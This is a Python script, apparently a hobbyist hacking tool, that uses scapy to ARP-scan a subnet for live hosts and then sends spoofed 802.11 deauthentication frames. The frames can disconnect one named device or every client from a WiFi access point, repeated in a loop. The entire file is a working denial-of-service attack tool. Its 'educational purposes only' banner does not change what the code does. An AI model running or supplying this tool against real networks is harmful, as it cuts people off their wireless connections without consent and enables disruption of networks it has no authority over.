from scapy.all import *
from scapy.all import ARP, Ether, srp
import optparse
import sys
from termcolor import colored
import time

print(colored("[+] Written by Romeos CyberGypsy","blue"))
print(colored("[+] Deauthenticate specified or all users from a wifi network","green"))
print(" ")
print(colored("[!] This script is only for educational purposes only. \nDo not use it to cause harm \nI will not be responsible for misuse of this script!!","red"))
print(" ")
print(colored("For any query, get in touch at lewiswaigwa30@gmail.com","green"))
print(colored("(C) Leusoft Revived","yellow"))
print(" ")
print(colored("[!] Before using this script, Ensure that your network interface is in monitor mode by running the following commands in your terminal:","red"))
print(colored("airmon-ng start <interface> or ifconfig <interface> mode monitor","yellow"))
time.sleep(1)
parser = optparse.OptionParser()
parser.add_option("-s",
                  "--scan-network",
                  dest = "cidr",
                  help = "Scan an entire CIDR subnet"
                  )
parser.add_option("-t",
                  "--target",
                  dest = "target",
                  help = "Deauthenticate a specific target via MAC Address. Defaults to ff:ff:ff:ff:ff:ff, for broadcasting"
                  )
parser.add_option("-g",
                  "--gateway",
                  dest = "gateway",
                  help = "MAC Address of the network's gateway"
                  )
parser.add_option("-i",
                  "--interface",
                  dest = "interface",
                  help = "Intended network interface to work with e.g wlan0"
                  )
parser.add_option("-p",
                  "--packets",
                  dest = "packets",
                  help = "Deauthentication packets to throw"
                  )
parser.add_option("-l",
                  "--loop",
                  dest = "loop",
                  help = "Number of times to send the deauthentication packets. Defaults to 1"
                  )

(values, keys) = parser.parse_args()

if sys.argv[1] == "-s" or sys.argv[1] == "--scan-network":
    #now set the target to local network subnet you want to scan
    
    target = values.cidr
    arp = ARP(pdst = target) #create ARP packet
    #note: ff:ff:ff:ff:ff:ff indicates broadcasting
    ether = Ether(dst = "ff:ff:ff:ff:ff:ff") #creating the Ether broadcast packet
    packet = ether/arp
    print(colored("[+] Network scanning initialized. This may take a while...","blue"))
    results = srp(packet, timeout = 5)[0] #setting a timeout so that the program won't get stuck
    #now the result is a list of pairs in the format (sent_packet, received_packet)
    clients = []
    for sent, received in results:
        #for each response, append ip and mac address
        clients.append({"ip":received.psrc, "mac":received.hwsrc})

    #now lets print the content of this list.
    for client in clients:
        print(colored("{} : {}" .format(client["ip"], client["mac"]),"green"))
        #This prints out the ip addresses of the active hosts in the network
        #alongside with their MAC Addresses. This is important for the future attack
        #vectors such as deauthentication of users

    sys.exit()

#lets deauthenticate users from the AP

if not values.target == None:
    target_mac = values.target
    #specifying the specific device to deauthenticate

else:
    target_mac = "ff:ff:ff:ff:ff:ff"
    #ff:ff:ff:ff:ff:ff indicates deauthenticating all users

dot11 = Dot11(addr1 = target_mac,
              addr2 = values.gateway,
              addr3 = values.gateway
              )
print(colored("[+] Crafting deauth packets...","green"))
packet = RadioTap()/dot11/Dot11Deauth(reason = 7)
#lets get the packets flying
try:
    print(colored("[+] Sending deauth packets. Attack initialized...","red"))
    x = 1
    if values.loop == None:
        num = 1
    else:
        num = int(values.loop)
    while num >=0:
        print("[+] Phase {}" .format(str(x)))
        x+=1
        sendp(packet, inter = 0.1, count = int(values.packets), iface = values.interface, verbose = 1)
        num-=1
    
except Exception as e:
    print(e)
    
sys.exit()
